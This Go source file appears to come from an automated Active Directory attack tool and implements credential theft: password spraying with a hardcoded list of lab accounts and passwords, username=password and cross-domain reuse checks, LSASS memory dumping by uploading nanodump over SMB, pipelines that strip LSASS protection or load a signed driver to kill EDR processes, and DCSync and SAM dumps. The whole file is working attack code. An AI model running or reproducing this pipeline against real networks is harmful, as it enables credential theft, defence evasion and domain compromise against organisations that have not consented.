package modules

import (
	"adpack/core"
	"adpack/tools"
	"adpack/utils"
	"context"
	"fmt"
	"log/slog"
	"os"
	"strings"
	"time"
)

var acquisitionPipelines = map[string]PipelineDef{
	"native": {
		Name:        "native",
		Delivery:    "exe",
		PayloadType: "native",
		RemoteExec:  true,
		ParseFn:     parseNanodumpOutput,
		Description: "Upload nanodump.exe via SMB, fork dump LSASS, parse with pypykatz",
	},
	"pplshade": {
		Name:        "pplshade",
		Delivery:    "exe",
		PayloadType: "pplshade",
		RemoteExec:  true,
		ParseFn:     parseNanodumpOutput,
		Description: "Upload PPLShade.exe + driver, strip LSASS PPL protection, dump with nanodump --fork",
	},
	"phantomkiller": {
		Name:        "phantomkiller",
		Delivery:    "exe",
		PayloadType: "phantomkiller",
		RemoteExec:  true,
		ParseFn:     parseNanodumpOutput,
		Description: "Upload BootRepair.sys + PhantomKiller.exe via SMB, load signed Lenovo driver, kill EDR processes via IOCTL, dump LSASS",
	},
}

type PipelineDef struct {
	Name        string
	Delivery    string
	PayloadType string
	RemoteExec  bool
	ParseFn     func(string) []core.Credential
	Description string
}

var weakPasswordSpray = []struct {
	Username string
	Password string
}{
	{"hodor", "hodor"},
	{"robb.stark", "sexywolfy"},
	{"eddard.stark", "FightP3aceAndHonor!"},
	{"catelyn.stark", "robbsansabradonaryarickon"},
	{"arya.stark", "Needle"},
	{"rickon.stark", "Winter2022"},
	{"jon.snow", "iknownothing"},
	{"sansa.stark", "345ertdfg"},
	{"brandon.stark", "iseedeadpeople"},
	{"tywin.lannister", "powerkingftw135"},
	{"jaime.lannister", "cersei"},
	{"tyron.lannister", "Alc00L&S3x"},
	{"joffrey.baratheon", "1killerlion"},
	{"robert.baratheon", "iamthekingoftheworld"},
	{"cersei.lannister", "il0vejaime"},
	{"stannis.baratheon", "Drag0nst0ne"},
	{"petyer.baelish", "@littlefinger@"},
	{"lord.varys", "_W1sper_$"},
	{"maester.pycelle", "MaesterOfMaesters"},
}

func runPasswordSpray(state *core.ADState, domain string) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	if domain == "" {
		return result
	}
	slog.Debug("Password spraying known weak credentials...")

	existing := make(map[string]bool)
	for _, c := range state.Creds {
		existing[c.Domain+"\\"+c.Username] = true
	}

	sprayDelay := 500 * time.Millisecond
	failThreshold := 3
	accountFails := make(map[string]int)

	for _, host := range state.Hosts {
		if host.IP == "" {
			continue
		}
		for _, wp := range weakPasswordSpray {
			key := domain + "\\" + wp.Username
			if existing[key] {
				continue
			}
			if accountFails[key] >= failThreshold {
				continue
			}
			time.Sleep(sprayDelay)
			cr := utils.RunCommand("nxc", "smb", host.IP,
				"-d", domain,
				"-u", wp.Username,
				"-p", wp.Password)
			if cr.ExitCode != 0 {
				accountFails[key]++
				continue
			}
			if strings.Contains(cr.Stdout, "[+]") {
				slog.Info("Spray: credential valid", "domain", domain, "username", wp.Username, "host", host.IP)
				cred := core.Credential{
					Type:      core.CredPlaintext,
					Username:  wp.Username,
					Domain:    domain,
					Secret:    wp.Password,
					Source:    "password_spray",
					Validated: true,
				}
				result.Creds = append(result.Creds, cred)
				existing[key] = true
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
					Source: "password_spray", Key: key,
					Value: wp.Password, Confidence: 1.0, Timestamp: time.Now(),
				})
				break
			}
			accountFails[key]++
		}
	}

	// Username=password spray for each enumerated user
	slog.Debug("Trying username=password combinations...")
	for _, u := range state.Users {
		key := domain + "\\" + u.Username
		if existing[key] {
			continue
		}
		for _, host := range state.Hosts {
			if host.IP == "" {
				continue
			}
			cr := utils.RunCommand("nxc", "smb", host.IP,
				"-d", domain,
				"-u", u.Username,
				"-p", u.Username)
			if cr.ExitCode == 0 && strings.Contains(cr.Stdout, "[+]") {
				slog.Info("Username=Password: credential valid", "domain", domain, "username", u.Username, "host", host.IP)
				cred := core.Credential{
					Type: core.CredPlaintext, Username: u.Username,
					Domain: domain, Secret: u.Username,
					Source: "username_spray", Validated: true,
				}
				result.Creds = append(result.Creds, cred)
				existing[key] = true
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
					Source: "username_spray", Key: key,
					Value: u.Username, Confidence: 1.0, Timestamp: time.Now(),
				})
				break
			}
		}
	}

	// Cross-domain password reuse: try known credentials against other domains
	slog.Debug("Testing cross-domain password reuse...")
	for _, cred := range state.Creds {
		if cred.Secret == "" || cred.Username == "" {
			continue
		}
		for _, host := range state.Hosts {
			if host.IP == "" || host.Domain == cred.Domain {
				continue
			}
			key := host.Domain + "\\" + cred.Username
			if existing[key] {
				continue
			}
			cr := utils.RunCommand("nxc", "smb", host.IP,
				"-d", host.Domain,
				"-u", cred.Username,
				"-p", cred.Secret)
			if cr.ExitCode == 0 && strings.Contains(cr.Stdout, "[+]") {
				slog.Info("Cross-domain reuse: credential valid", "domain", host.Domain, "username", cred.Username, "host", host.IP)
				newCred := core.Credential{
					Type: core.CredPlaintext, Username: cred.Username,
					Domain: host.Domain, Secret: cred.Secret,
					Source: "cross_domain_reuse", Validated: true,
				}
				result.Creds = append(result.Creds, newCred)
				existing[key] = true
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
					Source: "cross_domain_reuse", Key: key,
					Value: cred.Secret, Confidence: 0.9, Timestamp: time.Now(),
				})
			}
		}
	}

	if len(result.Creds) > 0 {
		slog.Info("Spray: credential(s) found", "count", len(result.Creds))
	} else {
		slog.Info("Spray: no weak credentials found")
	}
	return result
}

func RunCredentialAcq(state *core.ADState, profileName string, targetHost string) *core.ToolResult {
	result := &core.ToolResult{Success: true}

	selectTarget(state, targetHost)

	domain, user, pass, _ := getCredential(state)
	if domain == "" || pass == "" {
		return &core.ToolResult{
			Success: false,
			Evidence: []core.EvidenceEntry{{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "credential_acq", Key: "error",
				Value:      "no credentials available for spraying",
				Confidence: 0, Timestamp: time.Now(),
			}},
		}
	}

	slog.Debug("Spraying with credential", "domain", domain, "username", user)

	// Non-privileged: password spray, username=password, cross-domain reuse
	sprayResult := runPasswordSpray(state, domain)
	result.Creds = append(result.Creds, sprayResult.Creds...)
	result.Evidence = append(result.Evidence, sprayResult.Evidence...)

	if len(result.Creds) > 0 {
		result.Success = true
	}

	return result
}

func RunCredentialAcqPipeline(state *core.ADState, profileName string, targetHost string, exec core.Executor) *core.ToolResult {
	profile, ok := LookupProfile(profileName)
	if !ok {
		return &core.ToolResult{
			Success: false,
			Evidence: []core.EvidenceEntry{{
				Type: core.EvCredAcquired, Phase: core.PhasePrivEsc,
				Source: "evasion", Key: "error",
				Value: fmt.Sprintf("unknown profile: %s", profileName),
			}},
		}
	}

	pipeline, ok := acquisitionPipelines[profileName]
	if !ok {
		pipeline = acquisitionPipelines["standard"]
	}

	slog.Debug("Using evasion profile", "profile", profile.Name, "description", profile.Description)

	if profileName == "native" {
		slog.Debug("profile includes AMSI/ETW bypass", "profile", profileName)
	}

	host, found := selectTarget(state, targetHost)
	if !found {
		return &core.ToolResult{
			Success: false,
			Evidence: []core.EvidenceEntry{{
				Type: core.EvCredAcquired, Phase: core.PhasePrivEsc,
				Source: "credential_acq_pipeline", Key: "target", Value: "none",
				Confidence: 0, Timestamp: time.Now(),
			}},
		}
	}

	slog.Debug("Target", "ip", host.IP, "hostname", host.Hostname)

	slog.Debug("LSASS dump via nanodump...")

	result := executeNanodumpPipeline(state, host, pipeline, exec)

	// Fallback: nanodump failed; try impacket-secretsdump DCSync
	if !result.Success && len(result.Evidence) > 0 && !strings.Contains(result.Evidence[0].Value, "secretsdump") {
		slog.Debug("nanodump failed, trying DCSync via impacket-secretsdump...")
		dcHost := host
		if dc := findDC(state, host.Domain); dc.IP != "" {
			dcHost = dc
		}
		fallback := executeSecretsdumpPipeline(state, dcHost)
		if fallback.Success {
			return fallback
		}
	}

	// Fallback: try SAM dump via nxc
	if !result.Success {
		slog.Debug("Trying SAM dump via nxc...")
		samResult := executeSAMDump(state, host)
		if samResult.Success {
			return samResult
		}
	}

	return result
}

func isHex(s string) bool {
	for _, r := range s {
		if !((r >= '0' && r <= '9') || (r >= 'a' && r <= 'f') || (r >= 'A' && r <= 'F')) {
			return false
		}
	}
	return true
}

func isBogusUsername(s string) bool {
	lower := strings.ToLower(s)
	return lower == "" || lower == "n/a" || lower == "�" ||
		strings.Contains(lower, "total") ||
		strings.Contains(lower, "---") ||
		strings.HasPrefix(lower, "0x") ||
		strings.HasPrefix(lower, "0:") ||
		strings.Contains(lower, "error") ||
		strings.Contains(lower, "failed") ||
		strings.Contains(lower, "connection") ||
		strings.Contains(lower, "password") ||
		strings.Contains(lower, "warning") ||
		strings.Contains(lower, "warn") ||
		strings.Contains(lower, "impacket") ||
		strings.Contains(lower, "samba") ||
		len(s) > 50
}

func pickCred(creds []core.Credential, domain string, strict bool) (string, string, string, string) {
	var best core.Credential
	bestScore := -1
	for _, c := range creds {
		if strict && c.Domain != "" && !strings.EqualFold(c.Domain, domain) {
			continue
		}
		score := 0
		if c.Secret != "" && !strings.HasPrefix(c.Secret, "aad3b") {
			score++
		}
		if c.Domain != "" && strings.EqualFold(c.Domain, domain) {
			score++
		}
		if c.Username != "" && !strings.EqualFold(c.Username, c.Domain+"\\") {
			score++
		}
		if c.Validated {
			score++
		}
		if score > bestScore {
			bestScore = score
			best = c
		}
	}
	if bestScore < 0 {
		return "", "", "", ""
	}
	dom := best.Domain
	if dom == "" {
		dom = domain
	}
	secret := best.Secret
	hash := best.Hash
	if hash == "" && isHex(secret) && (len(secret) == 32 || len(secret) == 64) {
		hash = secret
		secret = ""
	}
	return dom, best.Username, secret, hash
}

func getDomainCredential(state *core.ADState, domain string) (string, string, string, string) {
	return pickCred(state.Creds, domain, true)
}

func FilterBogusState(state *core.ADState) *core.ADState {
	filtered := make([]core.Credential, 0, len(state.Creds))
	for _, c := range state.Creds {
		if state.Phases[core.PhaseCredentialAcq] == core.PhaseInProgress {
			if strings.HasPrefix(c.Username, "krbtgt") || strings.HasPrefix(c.Username, "Guest") {
				continue
			}
		}
		if !isBogusUsername(c.Username) {
			filtered = append(filtered, c)
		}
	}
	state.Creds = filtered
	return state
}

func selectTarget(state *core.ADState, preferred string) (core.Host, bool) {
	if preferred != "" {
		for _, h := range state.Hosts {
			if h.IP == preferred || h.Hostname == preferred {
				return h, true
			}
		}
	}
	if len(state.Hosts) > 0 {
		// Prefer non-DC hosts (member servers) for privileged operations
		for _, h := range state.Hosts {
			if !h.IsDC {
				return h, true
			}
		}
		// Fallback to DC if no non-DC host available
		return state.Hosts[0], true
	}
	return core.Host{}, false
}

func getCredential(state *core.ADState) (string, string, string, string) {
	return pickCred(state.Creds, "", false)
}

func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline PipelineDef, exec core.Executor) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, hash := getCredential(state)

	if !tools.Nanodump.Available() {
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "nanodump", Key: "status", Value: "tool not available",
		})
		result.Success = false
		return result
	}

	ncfg := tools.NanodumpConfig{
		Output: fmt.Sprintf("/tmp/lsass_%d.dmp", time.Now().Unix()),
	}

	ctx := context.Background()

	if pipeline.RemoteExec && domain != "" && pass != "" {
		slog.Debug("Deploying nanodump.exe to host via SMB", "ip", host.IP)
		remoteDir := `C:\Windows\Temp\`
		deployR := exec.Execute(ctx, core.Action{
			Artifact: "nanodump.exe", Method: "put",
			Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
		})
		if !deployR.Success {
			slog.Warn("Failed to deploy nanodump.exe")
			result.Success = false
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "nanodump", Key: "error",
				Value:     "deploy failed: " + deployR.Error,
				Timestamp: time.Now(),
			})
			return result
		}
		ndPath := deployR.Output

		dumpRemote := fmt.Sprintf(`C:\Windows\Temp\lsass_%d.dmp`, time.Now().UnixNano())
		ncfg.Output = dumpRemote

		cmd := fmt.Sprintf(`%s --write %s --fork`, ndPath, dumpRemote)
		target := tools.NetExecTarget{
			Protocol: "smb", Host: host.IP,
			Domain: domain, Username: user, Password: pass, Hash: hash,
		}
		cr, err := tools.NetExec.Run(ctx, target, "-x", []string{cmd})
		if err != nil || !cr.Success {
			exec.Execute(ctx, core.Action{
				Method: "cleanup", Arguments: []string{ndPath, dumpRemote}, Timeout: 15 * time.Second,
			})
			slog.Warn("nanodump remote execution failed")
			result.Success = false
			return result
		}

		slog.Debug("Retrieving dump via SMB...")
		localPath := fmt.Sprintf("/tmp/lsass_remote_%d.dmp", time.Now().Unix())
		getR := exec.Execute(ctx, core.Action{
			Artifact: dumpRemote, Method: "get",
			Arguments: []string{localPath}, Timeout: 60 * time.Second,
		})

		exec.Execute(ctx, core.Action{
			Method: "cleanup", Arguments: []string{ndPath, dumpRemote}, Timeout: 15 * time.Second,
		})

		if getR.Success {
			defer os.Remove(localPath)
			slog.Debug("Parsing dump with pypykatz...")
			parsed, err := tools.Nanodump.ParseDump(ctx, localPath)
			if err != nil {
				pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localPath)
				if pyr.Success {
					creds := pipeline.ParseFn(pyr.Stdout)
					result.Creds = append(result.Creds, creds...)
					for _, c := range creds {
						result.Evidence = append(result.Evidence, core.EvidenceEntry{
							Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
							Source: "nanodump", Key: c.Username + "@" + c.Domain,
							Value: c.Secret, Confidence: 0.85, RawOutput: pyr.Stdout,
							Timestamp: time.Now(),
						})
					}
					slog.Info("nanodump: credential(s) from host", "count", len(creds), "host", host.IP)
				}
			} else if parsed.Success {
				creds := pipeline.ParseFn(parsed.Stdout)
				result.Creds = append(result.Creds, creds...)
				for _, c := range creds {
					result.Evidence = append(result.Evidence, core.EvidenceEntry{
						Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
						Source: "nanodump", Key: c.Username + "@" + c.Domain,
						Value: c.Secret, Confidence: 0.85, RawOutput: parsed.Stdout,
						Timestamp: time.Now(),
					})
				}
				slog.Info("nanodump: credential(s) from host", "count", len(creds), "host", host.IP)
			}
		}
		return result
	}

	slog.Debug("Running nanodump locally...")
	r, err := tools.Nanodump.Run(ctx, tools.ExecutionRequest{
		Evasion: "fork",
	})
	if err != nil || r == nil || !r.Success {
		result.Success = false
		if r != nil {
			result.RawOutput = r.Stdout
		}
		return result
	}

	parsed, err := tools.Nanodump.ParseDump(ctx, ncfg.Output)
	if err != nil || !parsed.Success {
		result.Success = false
		result.RawOutput = r.Stdout
		return result
	}

	result.Success = true
	creds := pipeline.ParseFn(parsed.Stdout)
	result.Creds = append(result.Creds, creds...)
	result.RawOutput = r.Stdout
	return result
}

func parseNanodumpOutput(output string) []core.Credential {
	var creds []core.Credential
	lines := strings.Split(output, "\n")
	var currentUser, currentDomain string

	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		lower := strings.ToLower(trimmed)

		if strings.Contains(lower, "username") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) == 2 {
				currentUser = strings.TrimSpace(parts[1])
			}
		}
		if strings.Contains(lower, "domainname") || strings.Contains(lower, "domain name") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) == 2 {
				currentDomain = strings.TrimSpace(parts[1])
			}
		}
		if strings.Contains(lower, "ntlm") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) == 2 {
				hash := strings.TrimSpace(parts[1])
				if len(hash) == 32 {
					creds = append(creds, core.Credential{
						Type: core.CredHash, Username: currentUser,
						Domain: currentDomain, Hash: hash, Source: "nanodump",
					})
				}
			}
		}
	}
	return dedupCreds(creds)
}

func dedupCreds(creds []core.Credential) []core.Credential {
	seen := make(map[string]bool)
	var unique []core.Credential
	for _, c := range creds {
		key := c.Domain + "\\" + c.Username + ":" + c.Secret + c.Hash
		if !seen[key] {
			seen[key] = true
			unique = append(unique, c)
		}
	}
	return unique
}

func executeSAMDump(state *core.ADState, host core.Host) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, hash := getCredential(state)
	if domain == "" || user == "" {
		result.Success = false
		return result
	}
	exec := ExecutorFactory(core.HostRef{Name: host.IP, Domain: host.Domain}, domain, user, pass, hash)
	ctx := context.Background()
	r := exec.Execute(ctx, core.Action{
		Target: core.HostRef{Name: host.IP, Domain: domain},
		Method: "smb", Artifact: "--sam", Timeout: 60 * time.Second,
	})
	if r.Success {
		result.RawOutput = r.Output
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "nxc_sam", Key: host.IP, Value: "SAM dump completed",
			Timestamp: time.Now(),
		})
		slog.Info("SAM dump successful")
	} else {
		result.Success = false
	}
	return result
}

func executeSecretsdumpPipeline(state *core.ADState, host core.Host) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, _ := getCredential(state)
	if domain == "" || user == "" {
		result.Success = false
		return result
	}

	slog.Debug("DCSync via impacket-secretsdump against host", "host", host.IP)
	target := fmt.Sprintf("%s/%s:%s@%s", domain, user, pass, host.IP)
	args := []string{target, "-just-dc"}
	r := utils.RunCommand("impacket-secretsdump", args...)
	if r.Success {
		result.RawOutput = r.Stdout
		creds := parseSecretsdumpOutput(r.Stdout, domain)
		result.Creds = append(result.Creds, creds...)
		for _, c := range creds {
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "secretsdump", Key: c.Username + "@" + c.Domain,
				Value: c.Secret, Confidence: 0.9,
				RawOutput: r.Stdout, Timestamp: time.Now(),
			})
			if EnqueueHash != nil {
				EnqueueHash("ntlm", c.Hash, c.Username, c.Domain)
			}
		}
		slog.Info("Secretsdump: credentials found", "count", len(creds))
	} else {
		result.Success = false
		slog.Warn("Secretsdump failed", "error", r.Stderr)
	}
	return result
}

func parseSecretsdumpOutput(output, domain string) []core.Credential {
	var creds []core.Credential
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if strings.Contains(trimmed, ":::") && !strings.HasPrefix(trimmed, "[") {
			parts := strings.SplitN(trimmed, ":", 4)
			if len(parts) >= 4 {
				username := parts[0]
				if strings.Contains(username, "\\") {
					parts2 := strings.SplitN(username, "\\", 2)
					username = parts2[1]
				}
				nthash := strings.TrimSpace(strings.SplitN(parts[3], ":::", 2)[0])
				if nthash != "" && !strings.Contains(nthash, " ") && len(nthash) == 32 {
					creds = append(creds, core.Credential{
						Type: core.CredHash, Username: username,
						Domain: domain, Hash: nthash, Secret: nthash,
						Source: "secretsdump",
					})
				}
			}
		}
	}
	return creds
}
